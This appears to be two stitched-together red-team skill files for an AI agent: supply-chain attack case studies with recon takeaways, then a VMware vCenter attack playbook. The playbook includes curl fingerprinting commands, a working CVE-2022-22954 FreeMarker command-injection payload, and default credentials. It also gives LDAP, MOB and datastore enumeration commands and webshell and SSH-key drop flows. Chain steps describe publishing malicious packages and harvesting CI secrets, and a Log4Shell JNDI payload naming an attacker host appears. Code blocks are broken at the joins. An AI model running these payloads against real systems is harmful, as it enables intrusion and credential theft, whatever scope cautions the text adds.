  - CISA AA23-158A: https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-158a
  - Progress advisory: https://community.progress.com/s/article/MOVEit-Transfer-Critical-Vulnerability-31May2023
  - Mandiant: https://cloud.google.com/blog/topics/threat-intelligence/zero-day-moveit-data-theft
  - Huntress technical breakdown: https://www.huntress.com/blog/moveit-transfer-critical-vulnerability-rapid-response
- **Recon takeaway:** Vendor file-transfer products (MOVEit, Accellion FTA, GoAnywhere MFT, Cleo Harmony) are the recurring "internet edge, holds everyone's data, runs on Windows" pattern. Always fingerprint by HTML title / favicon hash early in recon; a single edge-product CVE = entire customer base.

### 4. Codecov bash uploader compromise (Apr 2021)

- **Flow:** Attackers gained access to Codecov's Docker image build process via a credential mistake in the image-creation flow, then modified the `Bash Uploader` script (`https://codecov.io/bash`) to exfiltrate environment variables to a third-party IP. The modification persisted from 31 Jan 2021 to 1 Apr 2021 — two months before detection by a customer who noticed an SHA-256 mismatch.
- **Root cause:** Docker image build leaked a credential allowing modification of the served bash script; no integrity verification (no signed pinned hash) on the customer side.
- **Impact:** Every CI run worldwide that piped `curl -s https://codecov.io/bash | bash` for 2 months exfiltrated env vars. Confirmed downstream victims: HashiCorp (rotated GPG key), Twilio, Rapid7 (source-code partial exposure), Mercari, Confluent, Atlassian.
- **References:**
  - Codecov post-mortem: https://about.codecov.io/security-update/
  - HashiCorp advisory: https://discuss.hashicorp.com/t/hcsec-2021-12-codecov-security-event-and-hashicorp-gpg-key-exposure/23512
  - Mercari disclosure: https://about.mercari.com/en/press/news/articles/20210521_incidentreport/
  - Rapid7: https://www.rapid7.com/blog/post/2021/05/13/rapid7-discloses-its-response-to-codecov-incident/
- **Recon takeaway:** "Curl-bash-install" patterns in public CI workflows are gold for this recon skill — search `.github/workflows/` for `curl ... | bash`, `wget ... | sh`, `iwr ... | iex`. Any third-party URL fed into a shell is a supply-chain blast radius. Pinned SHAs in workflows mitigate; absence of pinning = finding.

### 5. ua-parser-js npm hijack (Oct 2021)

- **Flow:** Attacker phished/credential-stuffed the maintainer's npm account and published `0.7.29`, `0.8.0`, and `1.0.0` of `ua-parser-js` (≈7M weekly downloads, transitively reaching Facebook, Microsoft, Amazon, IBM). The malicious versions ran a `preinstall` hook that downloaded a cryptominer + Windows password-stealer (Jason credential stealer).
- **Root cause:** Maintainer npm account had no 2FA / weak credentials; npm did not enforce 2FA for high-value publishers at the time.
- **Impact:** Packages live ~4 hours before takedown but tens of thousands of installs in that window. CISA issued an emergency alert — the first time CISA had ever warned on an npm-package compromise.
- **References:**
  - GitHub Security advisory: https://github.com/advisories/GHSA-pjwm-rvh2-c87w
  - CISA alert: https://www.cisa.gov/news-events/alerts/2021/10/22/malware-discovered-popular-npm-package-ua-parser-js
  - Maintainer's incident note: https://github.com/faisalman/ua-parser-js/issues/536
  - Snyk analysis: https://snyk.io/blog/npm-security-malicious-code-found-in-npm-package-ua-parser-js/
- **Recon takeaway:** Identify your target's top-30 npm/PyPI maintainers by package download count, then check whether their accounts have 2FA enabled (npm exposes this via `npm profile get` on org members, partially public via the registry API). Recon output: "these 4 maintainers control packages with X installs and have no 2FA per public registry data."

### 6. event-stream npm package (Nov 2018)

- **Flow:** Original maintainer Dominic Tarr (no longer using the module) handed `event-stream` (≈2M weekly downloads) to a new contributor named "right9ctrl" who'd offered to maintain it. The new maintainer added `flatmap-stream` as a dependency, then pushed an update to `flatmap-stream` containing payload targeting the Copay bitcoin wallet's build — stole BTC/BCH wallet seeds from any Copay user.
- **Root cause:** Social engineering of a maintenance-handover; no review of new contributors taking over critical packages. The malicious dep was only triggered when `event-stream` was bundled into the Copay wallet (build-context targeting).
- **Impact:** Copay wallet users had keys stolen; exact dollar damage never disclosed publicly. Triggered the npm-wide 2FA push and "popular packages need additional review" policy.
- **References:**
  - GitHub Security advisory: https://github.com/advisories/GHSA-mh6f-8j2x-4483
  - npm post-mortem: https://github.blog/2018-11-26-npm-package-event-stream/
  - Original disclosure thread: https://github.com/dominictarr/event-stream/issues/116
  - Snyk write-up: https://snyk.io/blog/a-post-mortem-of-the-malicious-event-stream-backdoor/
- **Recon takeaway:** Check `npm view <pkg> maintainers` and recent maintainer changes for packages your target depends on. A maintainer change in the past 90 days on a 100K+ download package is a yellow flag. Also: payload-targeting-by-build-context (only fires when bundled into specific app) is HARD to detect — static scanners miss it.

### 7. PHP Git server compromise (March 2021)

- **Flow:** Attackers pushed two malicious commits to the official `php-src` git repository on `git.php.net`, signed as Rasmus Lerdorf and Nikita Popov. The commits added a Zend backdoor that executed code from the `User-Agentt` HTTP header (note double-t).
- **Root cause:** Self-hosted git server (Gitolite-based `git.php.net`) had a credential / authentication flaw — possibly password-stored-in-plain in a user database leak. PHP team migrated to GitHub as canonical source after this incident.
- **Impact:** Backdoor commits caught within hours, never shipped in a release. But this is the canonical case of "self-hosted source-of-truth = single point of failure."
- **References:**
  - PHP.net post-mortem: https://news-web.php.net/php.internals/113838
  - Nikita Popov's analysis: https://externals.io/message/113848
  - ZDNet coverage: https://www.zdnet.com/article/php-internal-git-server-hacked-with-malicious-code-pushed-to-the-php-src-repo/
- **Recon takeaway:** Targets running self-hosted git (Gitea, Gitolite, Phabricator, Bitbucket Server) are higher-risk than GitHub-hosted. Recon should fingerprint git-server software, check for default creds, and watch for SSH-key-based pushes from unexpected IPs (visible in commit metadata).

### 8. Log4Shell (CVE-2021-44228, Dec 2021)

- **Flow:** Not a supply-chain ATTACK per se, but the canonical "you don't know what's in your dependency tree" event. A JNDI lookup feature in Apache Log4j 2.x allowed remote code execution via `${jndi:ldap://attacker/...}` in any logged string. Because Log4j is transitively pulled by thousands of Java apps, hundreds of millions of systems were vulnerable.
- **Root cause:** Unsafe-by-default feature shipped in 2013 (`MessageLookup` substitution); deeply nested transitive dependency made inventory and patching almost impossible.
- **Impact:** "Most critical vulnerability in a decade" per CISA Director Jen Easterly. Affected every major cloud, every Apache product, every Java enterprise stack. Ongoing mass exploitation by Conti, Khonsari ransomware, state actors.
- **References:**
  - CISA Log4j page: https://www.cisa.gov/news-events/cybersecurity-advisories/aa21-356a
  - Apache advisory: https://logging.apache.org/log4j/2.x/security.html
  - LunaSec breakdown: https://www.lunasec.io/docs/blog/log4j-zero-day/
  - GovCERT.ch tree of impacted products: https://www.cisa.gov/known-exploited-vulnerabilities-catalog (KEV entry)
- **Recon takeaway:** SBOMs are the answer here. The recon skill's Step 8 (SBOM mining) earns its keep — pulling SPDX/CycloneDX from public release artefacts gives you exact transitive dependency versions, which you can then map to OSV / NVD for known CVEs. Most orgs underestimate their transitive depth.

### 9. tj-actions/changed-files GitHub Action compromise (CVE-2025-30066, March 2025)

- **Flow:** Attacker compromised the `tj-actions/changed-files` GitHub Action (used by ~23,000 repos) and modified all version tags v1–v45 to point to a malicious commit. The injected code ran `printenv` and dumped CI secrets to GitHub Actions logs — visible to anyone with read access on public repos.
- **Root cause:** Mutable tag references in GitHub Actions — `uses: tj-actions/changed-files@v35` resolves at run time, so an attacker who controls the repo can repoint old tags. Most consumers had not pinned to commit SHA (`@<sha>`).
- **Impact:** ~23,000 repositories impacted; CISA added to KEV; thousands of secrets (AWS keys, npm tokens, Docker Hub creds) leaked into public Action logs. Multiple downstream incidents (Coinbase, Cloudflare, others) traced back.
- **References:**
  - CISA KEV entry: https://www.cisa.gov/news-events/alerts/2025/03/18/supply-chain-compromise-third-party-github-action-cve-2025-30066
  - StepSecurity disclosure: https://www.stepsecurity.io/blog/harden-runner-detection-tj-actions-changed-files-action-is-compromised
  - Wiz analysis: https://www.wiz.io/blog/github-action-tj-actions-changed-files-supply-chain-attack-cve-2025-30066
  - Semgrep: https://semgrep.dev/blog/2025/popular-github-action-tj-actionschanged-files-is-compromised/
- **Recon takeaway:** This is the highest-yield current recon vector. Grep public repos for `uses: <org>/<repo>@v\d+` (mutable tag) versus `uses: <org>/<repo>@<sha>` (pinned). Any unpinned third-party action = supply-chain risk. The skill's Step 6 should explicitly flag mutable-tag usage.

### 10. PyPI typosquats (`colourama`, `python3-dateutil`, `jeIlyfish`, et al.)

- **Flow:** Attackers register PyPI packages with names visually/typographically similar to popular ones — `colourama` for `colorama`, `python3-dateutil` for `python-dateutil`, `jeIlyfish` (capital-I instead of L) for `jellyfish`. Each contained `setup.py` post-install hooks exfiltrating SSH keys, GPG keys, GitHub tokens, or installing crypto-stealers targeting `~/.bitcoin/wallet.dat`.
- **Root cause:** PyPI permits visually-confusable names; pip resolves names by exact string match. No human-review gate on new package publication.
- **Impact:** Each campaign typically <10K installs before takedown, but `jeIlyfish` lived 1 year (Dec 2018 → Dec 2019). Cumulative: dozens of campaigns documented annually by Snyk/Phylum/Sonatype/ReversingLabs.
- **References:**
  - ReversingLabs jeIlyfish/python3-dateutil: https://www.reversinglabs.com/blog/mining-for-malicious-ruby-gems
  - Snyk colourama / pytagora analysis: https://snyk.io/blog/malicious-packages-found-to-be-typo-squatting-in-pypi/
  - Phylum 2024 typosquat report: https://blog.phylum.io/the-state-of-the-software-supply-chain/
  - Sonatype 2024 State of the Software Supply Chain (>700K malicious packages found): https://www.sonatype.com/state-of-the-software-supply-chain/
- **Recon takeaway:** Step 5 of the skill (typosquat candidate generation) maps directly here. For external recon, you LIST candidate typosquat names — you NEVER publish unless explicitly authorized. The deliverable is "these 17 typosquat variants of your top deps are currently unclaimed; recommendation: register them defensively."

### 11. Alex Birsan dependency-confusion disclosure (Feb 2021)

- **Flow:** Birsan extracted internal npm scope names from leaked `package.json` files (publicly cached on archive.org, accidentally-public GitHub repos, JS bundles) for Apple, Microsoft, PayPal, Shopify, Uber, Tesla, Yelp, and ~35 others. He published packages on public npm/PyPI/RubyGems with those internal names AND a higher semver. Most companies' build systems then resolved the public package over the internal one and executed his telemetry-only payload.
- **Root cause:** Package managers (npm, pip, gem) default to "highest version wins, regardless of registry." Internal-package names leaked to external sources. No scope-to-registry enforcement.
- **Impact:** $130K+ in bug bounties (highest known SINGLE researcher payout across multiple programs in 2021); birthed the entire "dependency confusion" attack class; npm/PyPI/Microsoft Azure Artifacts all issued mitigations.
- **References:**
  - Original Birsan write-up: https://medium.com/@alex.birsan/dependency-confusion-4a5d60fec610
  - Microsoft white paper: https://azure.microsoft.com/en-us/resources/3-ways-to-mitigate-risk-using-private-package-feeds/
  - GitHub post-mortem (npm side): https://github.blog/2021-02-12-how-to-prevent-dependency-confusion-on-public-package-registries/
  - Snyk research: https://snyk.io/blog/dependency-confusion-vulnerability-novel-supply-chain-attack/
- **Recon takeaway:** This is the founding citation for Step 3 + Step 4 of the skill. Internal scope discovery via JS bundles is the canonical recon path. Note Birsan's severity calibration: "name is unclaimed" alone was enough at most targets because their builds used `npm install` against a config that fell through to public npm — but the skill's severity table correctly notes this isn't universal.

### 12. XZ Utils (CVE-2024-3094, March 2024)

- **Flow:** "Jia Tan" (`JiaT75`) social-engineered the maintainer of `xz-utils` (an upstream OSS compression library used in nearly every Linux distro) over 2+ years. Once granted co-maintainer status, they inserted a multi-stage backdoor into `liblzma` build process — obfuscated as test fixtures — that would hijack SSH authentication via OpenSSH's systemd-notify integration.
- **Root cause:** Single-maintainer OSS burnout + nation-state-grade patience (Operation J / suspected APT). The backdoor was caught BEFORE major distros shipped it (only Fedora Rawhide and Debian unstable had it briefly) because Andres Freund noticed a 500ms SSH delay during a benchmark.
- **Impact:** Caught before mass deployment, near-miss event. Triggered industry-wide reassessment of "single-maintainer critical OSS" risk. CISA, NIST, OpenSSF all issued post-mortems.
- **References:**
  - CISA advisory: https://www.cisa.gov/news-events/alerts/2024/03/29/reported-supply-chain-compromise-affecting-xz-utils-data-compression-library-cve-2024-3094
  - Andres Freund's original disclosure: https://www.openwall.com/lists/oss-security/2024/03/29/4
  - Russ Cox timeline: https://research.swtch.com/xz-timeline
  - Sam James technical breakdown: https://gist.github.com/thesamesam/223949d5a074ebc3dce9ee78baad9e27
- **Recon takeaway:** Hardest case for external recon — social-engineering a maintainer over years leaves few external signals. But: GitHub commit-history analysis (new contributors gaining commit access on critical libs, commits adding obfuscated test fixtures, build-only-on-release changes) is what Andres Freund effectively did. The skill's Step 2 (enumerate public repos) can be extended to "watch for high-trust grants to low-history accounts."

---

### Coverage map: cases → recon skill steps

| Step in skill | Anchoring case(s) |
|---|---|
| Step 1 — GitHub org discovery | Birsan 2021, XZ 2024 |
| Step 2 — Public repo artefact mining | Codecov 2021, XZ 2024, PHP 2021 |
| Step 3 — Internal package-name discovery | Birsan 2021 |
| Step 4 — Dependency-confusion check | Birsan 2021, ua-parser-js 2021 |
| Step 5 — Typosquat candidates | PyPI `colourama`/`jeIlyfish`, event-stream 2018 |
| Step 6 — GitHub Actions workflow injection | tj-actions/changed-files 2025, Codecov 2021 |
| Step 7 — Docker/container registry mining | Codecov 2021, 3CX 2023 |
| Step 8 — SBOM / artefact metadata | Log4Shell 2021, MOVEit 2023 |
| Step 9 — Internal registry URL leakage | Birsan 2021, SolarWinds 2020 |
| Step 10 — npm/PyPI org presence | ua-parser-js 2021, event-stream 2018 |

### Patterns across all 12 cases

- **Code-signing does NOT save you** — SolarWinds, 3CX, ua-parser-js all shipped legitimately-signed malicious code.
- **Pinning to mutable references is the recurring failure** — `curl | bash` (Codecov), `@v35` action tags (tj-actions), `^1.0.0` semver (Birsan, event-stream).
- **Maintainer-account compromise > technical CVE** for npm/PyPI ecosystem — 6 of 12 cases.
- **Cascading supply chain is now normal** — 3CX from X_TRADER; Codecov → HashiCorp → HashiCorp's downstream users. Assume your target's vendors' vendors are in scope conceptually.
- **CI runners are the highest-value foothold** — every case where attacker code executed on a CI runner yielded cloud / GitHub / secrets in bulk.

---

## Related Skills & Chains

- **`hunt-rce`** — Dependency confusion lands as RCE on whatever runner installs the package; CI runners are the highest-value target. Chain primitive: internal package name leaked in public JS bundle / SBOM / Docker image → publish malicious package to public npm/PyPI under same name with higher version → next `npm install` / `pip install` on CI runner executes attacker code in `preinstall` hook → `hunt-rce` post-foothold (env-var extraction yields AWS keys, GitHub PATs, Slack tokens) → CI-plane takeover.
- **`cloud-iam-deep`** — CI runners have IAM credentials; supply-chain RCE there is a credential-exfil bonanza. Chain primitive: malicious package executes on GitHub Actions runner → reads `$AWS_ACCESS_KEY_ID` / `$GITHUB_TOKEN` from env → `cloud-iam-deep` enumeration → IAM-privilege-escalation chain → production cloud-plane access.
- **`offensive-osint`** — Recon discipline overlaps heavily; SBOMs, JS bundles, GitHub org enumeration, Docker registry tags all live in both. Chain primitive: `offensive-osint` GitHub-org recon yields internal package names referenced in CI workflows → `supply-chain-attack-recon` cross-references these against public npm/PyPI for typosquat/confusion candidates.
- **`hunt-cloud-misconfig`** — Container registries (Docker Hub, GHCR, ECR public) frequently expose private images by accident. Chain primitive: SBOM mining reveals `internal-tools-v2:latest` referenced → check Docker Hub for accidentally-public mirror → `hunt-cloud-misconfig` registry enum → pull image → extract secrets baked into layers.
- **`triage-validation`** + **`redteam-report-template`** — Supply-chain RECON is in scope; actual publishing is EXTERNAL-OFFENSIVE and needs explicit written sign-off. Chain primitive: recon-only candidate list assembled → run through `triage-validation` 7-Question Gate (specifically: "can I demonstrate impact WITHOUT publishing?") → report as "dependency-confusion candidate inventory + reproduction steps" via `redteam-report-template`, never as a published-package PoC unless client signed off in writing.


## SOURCE: hunt-skills/vmware-vcenter-attack/SKILL.md

## When to use

Trigger when external recon shows ANY of:
- Banner: "VMware vCenter Server", "VMware vSphere Client"
- URL paths: `/ui`, `/ui/login`, `/websso/SAML2/Metadata`, `/sdk`, `/mob` (Managed Object Browser)
- TLS cert SAN includes `vcenter` / `vsphere` / `vcsa` / `psc` / `vmware`
- Workspace ONE Access / Identity Manager: `/SAAS`, `/SAAS/auth`, `/SAAS/login`, `/SAAS/horizon`
- VMware Aria / vRealize: `/vco`, `/vco-controlcenter`, `/orchestrator`, `/lcm/api/v1`
- Horizon View: `/portal`, `/admin`

Do NOT use for:
- Internal-network vCenter (out of scope — external boundary discipline)
- Pure ESXi hypervisor exposed without management plane (rare on internet; flag as separate finding)

---

# Build info endpoint (often public; revealing exact patch level)
curl -sk "https://$TARGET/sdk/vimServiceVersions.xml"

# UI build (visible in page source)
curl -sk "https://$TARGET/ui/login" | grep -oE 'build[^"]{0,40}'
curl -sk "https://$TARGET/ui/" | grep -oE 'vsphere[^"]{0,40}'

# REST API version (vSphere 7+)
curl -sk "https://$TARGET/api/appliance/system/version"

# Cert metadata
echo | openssl s_client -connect "$TARGET:443" -servername "$TARGET" 2>/dev/null | openssl x509 -noout -text | grep -A1 "Subject Alt"

# SSO Admin Service (info disclosure)
curl -sk "https://$TARGET/sso-adminserver/sdk/vsphere.local"
curl -sk "https://$TARGET/websso/SAML2/Metadata/vsphere.local"
```

Map build → version → CVE applicability via VMware advisories (vmware.com/security/advisories).

---

## Step 2 — CVE matrix (external-exploitable, sorted by historical impact)

| CVE | Affected | Vector | Status |
|---|---|---|---|
| **CVE-2024-37085** | ESXi 7.0/8.0 < specific patch | AD group "ESX Admins" auto-admin bypass | High — Domain takeover→ESXi RCE, exploited in ransomware ops |
| **CVE-2024-22273** | ESXi/Workstation/Fusion/vCenter storage controller | OOB read/write — requires VM-local access (NOT a pre-auth network SSRF; see Section 9) | Important (CVSS 8.1), not external pre-auth |
| **CVE-2024-22252/53** | Workstation/Fusion (not vCenter) | Sandbox escape | Not external |
| **CVE-2023-34048** | vCenter 7/8 < specific build | DCE/RPC pre-auth heap OOB write → RCE | Critical, patched 2023-10 |
| **CVE-2023-20887** | Aria Operations for Networks | Pre-auth command injection → RCE | Critical |
| **CVE-2023-20892** | vCenter 7/8 | Use-after-free in DCE/RPC | High |
| **CVE-2022-31656/31659** | Workspace ONE Access 21.x | Pre-auth SSRF + auth bypass | Critical chained |
| **CVE-2022-22954** | Workspace ONE Access | Pre-auth server-side template injection (SSTI) → RCE | Critical, widely exploited |
| **CVE-2021-22005** | vCenter 6.7/7.0 < build | Analytics service pre-auth file upload → RCE | Critical |
| **CVE-2021-21985** | vCenter 6.5/6.7/7.0 < build | vSAN Health Check plugin pre-auth RCE | Critical |
| **CVE-2021-21972** | vCenter 6.5/6.7/7.0 < build | vRealize plugin `/ui/vropspluginui/rest/services/uploadova` pre-auth file upload → RCE | Critical, exploited heavily |
| **CVE-2020-3992** | ESXi OpenSLP | Pre-auth use-after-free → RCE | Critical, ESXi ransomware vector |
| **CVE-2019-5544** | ESXi OpenSLP | Pre-auth heap overflow | Critical |

---

# Detection only — DO NOT execute the file upload without explicit scope OK
curl -sk -o /dev/null -w "%{http_code}\n" \
  "https://$TARGET/ui/vropspluginui/rest/services/uploadova"

# 401 → patched (auth required)

curl -sk -o /dev/null -w "%{http_code}\n" \
  "https://$TARGET/ui/vropspluginui/rest/services/getstatus"
```

Public PoC by Mikhail Klyuchnikov exists; do not execute against client infra without explicit RCE-attempt sign-off.

---

# Stage A — detection only: reachability + baseline. No command execution yet.
curl -sk -o /tmp/wone_baseline.txt -w "%{http_code}\n" \
  "https://$TARGET/catalog-portal/ui/oauth/verify?error=&deviceUdid=probe"

# 4xx with FreeMarker/catalog-portal error template → endpoint present, candidate vulnerable.

# Stage B — execution (ONLY with explicit RCE-attempt sign-off): emit a unique canary

# so a coincidental WAF/error page containing "uid=" cannot be mistaken for real output.
CANARY="VCTR$(head -c8 /dev/urandom | od -An -tx1 | tr -d ' \n')"
curl -sk "https://$TARGET/catalog-portal/ui/oauth/verify?error=&deviceUdid=\${\"freemarker.template.utility.Execution\"?new()(\"echo ${CANARY}; id\")}"

# Confirmed RCE ONLY if the response contains the exact $CANARY echoed back AND "uid=" output

# that is absent from /tmp/wone_baseline.txt (in-band command output, body-diff against baseline).
```

Confirmed RCE requires the unique `$CANARY` reflected in-band plus `uid=` output not present in the Stage-A baseline → critical. Stop and report. A bare `uid=` with no canary echo is NOT confirmation.

---

## Step 5 — Default credentials (frequently still valid on lab/staging vCenters)

| Product | Default user | Default password |
|---|---|---|
| vCenter 6.x | `administrator@vsphere.local` | `<set-during-install>` |
| vCenter Appliance root | `root` | `vmware` (legacy) or `<set>` |
| ESXi root | `root` | `<blank>` or `vmware` |
| vCenter Server Appliance Mgmt (5480) | `root` | `<set-during-install>` |
| Aria Operations | `admin` | `vmware` (legacy) |
| Workspace ONE | `admin` | `<set>` |

⚠ **Do not spray vCenter — `administrator@vsphere.local` has VERY low lockout threshold** (often 3 attempts → 60s lockout, configurable to permanent). One attempt with high-confidence guess only. Use creds discovered in breach corpora.

---

# SSO Admin endpoint (frequently exposes domain info)
curl -sk "https://$TARGET/websso/SAML2/Metadata/vsphere.local" | xmllint --format -

# Extract Identity Source info
curl -sk "https://$TARGET/sso-adminserver/sdk/vsphere.local"

# Try anonymous LDAP bind to vmdir (port 389/636 if exposed)
ldapsearch -x -H "ldap://$TARGET:389" -b "" -s base
ldapsearch -x -H "ldap://$TARGET:389" -b "cn=Configuration,cn=vmware,cn=cis,dc=vsphere,dc=local"
```

---

## Step 7 — Managed Object Browser (MOB) — frequently leaks data

```bash
curl -skI "https://$TARGET/mob"

# 200 → MOB exposed → can browse VMs, hosts, datastores, sessions without credentials in some misconfigs

# Auth'd MOB lets you walk the entire vSphere tree:
curl -sk -u 'administrator@vsphere.local:<pw>' "https://$TARGET/mob/?moid=ServiceInstance&doPath=content"
```

---

# Get session token
curl -sk -X POST -u 'user@vsphere.local:<pw>' "https://$TARGET/api/session"

# List VMs
curl -sk -H "vmware-api-session-id: <token>" "https://$TARGET/api/vcenter/vm"

# List hosts
curl -sk -H "vmware-api-session-id: <token>" "https://$TARGET/api/vcenter/host"

# List datastores
curl -sk -H "vmware-api-session-id: <token>" "https://$TARGET/api/vcenter/datastore"

# Datastore file download (HUGE — VMDK files, snapshots, credentials in cloud-init)

# /folder/<path>?dsName=<ds>&dcPath=<dc>
curl -sk -H "vmware-api-session-id: <token>" "https://$TARGET/folder?dsName=datastore1&dcPath=Datacenter"
```

---

# Metadata
curl -sk "https://$TARGET/SAAS/auth/saml/response"
curl -sk "https://$TARGET/SAAS/auth/wsfed/services/idp"
curl -sk "https://$TARGET/SAAS/jersey/manager/api/health"
curl -sk "https://$TARGET/catalog-portal/services/airwatch/identifiers"

# vRealize Operations Manager
curl -sk "https://$TARGET/suite-api/api/versions"
curl -sk "https://$TARGET/casa/nodes/thumbprints"

# Aria Automation
curl -sk "https://$TARGET/csp/gateway/am/api/about"
curl -sk "https://$TARGET/cluster-administration/api/health"

# vRealize Orchestrator
curl -sk "https://$TARGET/vco/api/about"
curl -sk "https://$TARGET/vco-controlcenter/api/health"
```

---

## Tooling

- **`vCenter-Exploit` collection** (multiple PoCs on GitHub for 21972, 21985, 22005)
- **`Greenbone/openvas-scanner` VMware NASL plugins** — version detection
- **`nuclei`** templates: `vmware-vcenter-*.yaml`, `cve-2021-21972.yaml`, `cve-2022-22954.yaml`
- **`Metasploit`** modules: `exploit/multi/http/vmware_vcenter_*`

---

## Detection patterns (what defenders/SOC will see)

- Excessive 404s on `/ui/vropspluginui/*` — IDS signature
- POST to `/sdk` from non-management IP
- `administrator@vsphere.local` auth failures
- TLS handshake fingerprint changes
- Plugin upload to vRealize endpoint

Pair with `mid-engagement-ir-detection` skill — vCenter is monitored heavily in mature SOCs.

---

## External-only boundary check

If recon reveals vCenter only via VPN (not direct internet) → STOP. That is internal infrastructure and outside the external-only AI scope per `feedback_skill_boundaries`. The user handles internal vCenter work directly.

Internet-exposed vCenter is unfortunately common on the perimeter — and frequently outdated by years. The 2021-21972 / 21985 / 22954 trifecta still pays in 2026 because patching cycles for hypervisor management are slow and vendor-managed.

---

## Severity scoring guidance (red-team deliverable context)

| Finding | Severity |
|---|---|
| vCenter on internet, current patch | Informational (attack surface note) |
| vCenter on internet, missing patches with public RCE | **Critical** (entire virtualization plane compromise) |
| vCenter on internet + default admin password | **Critical** (immediate full takeover) |
| Workspace ONE on internet, unpatched 22954 | **Critical** |
| MOB anonymously accessible | **High** (full topology disclosure) |
| /sdk reachable + version disclosure only | **Medium** (info disclosure + attack-surface concentration) |

---

## Anti-patterns

- **DO NOT spray vCenter SSO** — lockout is aggressive; one chance often
- **DO NOT execute file-upload PoCs without explicit OK** — they create persistent webshells; cleanup overhead and audit trail
- **DO NOT confuse ESXi-management-on-internet with vCenter** — different attack surfaces; ESXi Open SLP CVEs target port 427
- **DO NOT skip SSL handshake banner check** — VMware exposes versions there; this is the lowest-noise initial probe

---

## Bridge to neighboring skills

- `enterprise-vpn-attack` — vCenter is frequently the post-VPN target; if VPN is breached, vCenter is the natural next pivot (but internal — defer to user)
- `m365-entra-attack` — vCenter SSO sometimes federated to Entra; cred-chain bridging
- `mid-engagement-ir-detection` — vCenter monitoring is sensitive; expect mid-engagement mitigations
- `redteam-report-template` — vCenter findings need clear blast-radius framing (this is the virtualization plane, not just an app)

---

## Related Skills & Chains

- **`hunt-saml`** — vCenter Workspace ONE / VMware Identity Manager publishes SAML SP metadata at `/SAAS/API/1.0/GET/metadata/idp.xml` and consumes assertions at predictable ACS URLs. Chain primitive: vCenter SAML SP metadata reachable → IdP fingerprinted → `hunt-saml` XSW1-XSW8 against the federating IdP → forged assertion with `userPrincipalName=administrator@vsphere.local` → SP-impersonation as vCenter admin → full virtualization-plane takeover.
- **`hunt-rce`** — VMware's high-impact CVE catalog (CVE-2021-21972, CVE-2021-21985, CVE-2022-22954, CVE-2023-20887) is almost entirely pre-auth RCE. Chain primitive: vCenter version fingerprint via SSL banner or `/ui/login` body → confirm patch level missing → `hunt-rce` deserialization/SSTI gadget from the matching CVE PoC → `root` on vCenter appliance → API-token mint → cluster-wide VM control.
- **`enterprise-vpn-attack`** — VPN compromise + vCenter on internal-only is a natural post-VPN pivot, but external-only engagement scope sometimes forbids it. Chain primitive: VPN appliance CVE → foothold inside corp network → if scope permits, `vmware-vcenter-attack` becomes reachable on internal-only vCenter → datacenter takeover.
- **`m365-entra-attack`** — Some VMware deployments federate vCenter SSO to Entra. Chain primitive: vCenter SSO discovery → AuthURL points to `login.microsoftonline.com` → `m365-entra-attack` Entra ATO on `administrator@vsphere.local` synced identity → SAML assertion → vCenter admin without ever brute-forcing vCenter SSO.
- **`mid-engagement-ir-detection`** — VMware vSAN/vCenter alerting is sensitive; expect SOC to patch or block within hours of detection. Chain primitive: confirmed vCenter CVE → run `mid-engagement-ir-detection` baseline capture BEFORE attempting exploitation → if response patterns change mid-test, capture the SOC-patched state as a SECOND finding (defensive-action observed). Package both via `redteam-report-template`.

---

## Disclosed CVEs & coordinated-disclosure citations

These are the load-bearing public references for every CVE called out in the matrix above. Every entry includes the vendor advisory, the originating researcher writeup or KEV-catalog entry, and (where public) in-the-wild exploitation references.

### 1. CVE-2021-21972 — vCenter `vropspluginui` unauthenticated arbitrary file upload (canonical pre-auth RCE)
- **Affected:** vCenter Server 6.5 < 6.5 U3n, 6.7 < 6.7 U3l, 7.0 < 7.0 U1c (vRealize Operations vCenter plugin bundled with every default install — Linux or Windows variant matters for payload). VMware Cloud Foundation 3.x/4.x also bundles.
- **Attack flow:** Unauth POST to `/ui/vropspluginui/rest/services/uploadova` with a tar/OVA containing a path-traversal entry. On Windows write `webshell.jsp` under the vsphere-ui webroot for SYSTEM; on Linux drop `authorized_keys` under `/home/vsphere-ui/.ssh/` and SSH in.
- **Root cause:** Endpoint exposed by the vRealize Operations plugin lacked any authentication filter; the `uploadova` handler did not sanitize archive entry paths.
- **Disclosure:** Reported by Mikhail Klyuchnikov (Positive Technologies / PT SWARM) in autumn 2020; advisory + patch published 2021-02-23 as VMSA-2021-0002; PoC on GitHub the next day triggered mass scanning. **CISA KEV:** added 2021-11-03. Year discovered 2020, patched 2021.
- **References:** https://support.broadcom.com/web/ecx/support-content-notification/-/external/content/SecurityAdvisories/0/23599 ; https://swarm.ptsecurity.com/unauth-rce-vmware/ ; https://www.tenable.com/blog/cve-2021-21972-vmware-vcenter-server-remote-code-execution-vulnerability ; https://attackerkb.com/topics/lrfxAJ9nhV/vmware-vsphere-client-unauth-remote-code-execution-vulnerability-cve-2021-21972

### 2. CVE-2021-21985 — vCenter vSAN Health Check plug-in pre-auth RCE
- **Affected:** vCenter Server 6.5 < 6.5 U3p, 6.7 < 6.7 U3n, 7.0 < 7.0 U2b (vSAN Health Check plugin is enabled by default whether or not vSAN is in use).
- **Attack flow:** Unauthenticated abuse of `ProxygenController` in the vSAN Health plugin → Java unsafe reflection chained with an SSRF primitive → arbitrary method invocation as `vsphere-ui` → command execution.
- **Root cause:** Missing input validation + dangerous reflection sink reachable from an unauthenticated REST surface.
- **Disclosure:** Reported by Ricter Z (Yang Hao) of 360 Noah Lab; advisory VMSA-2021-0010 published 2021-05-25. Public PoC and Metasploit module followed within days; honeypots saw active exploitation. Year discovered 2021, patched 2021.
- **References:** https://www.vmware.com/security/advisories/VMSA-2021-0010.html ; https://noahblog.360.cn/vcenter-server-rce/ (Ricter Z writeup) ; https://www.rapid7.com/db/modules/exploit/linux/http/vmware_vcenter_vsan_health_rce/ ; https://www.bleepingcomputer.com/news/security/vmware-warns-of-critical-bug-affecting-all-vcenter-server-installs/

### 3. CVE-2021-22005 — vCenter Analytics service arbitrary file upload → RCE
- **Affected:** vCenter Server 6.7 < 6.7 U3o, 7.0 < 7.0 U2d. Cloud Foundation 3.x/4.x bundled vCenter.
- **Attack flow:** Unauth POST to the Analytics endpoint on port 443 (`/analytics/telemetry/ph/api/hyper/send`) writes attacker-controlled file outside the intended directory; chained with subsequent service abuse to reach RCE as the vCenter service account.
- **Root cause:** Analytics/CEIP endpoint did not authenticate file uploads and did not validate target path.
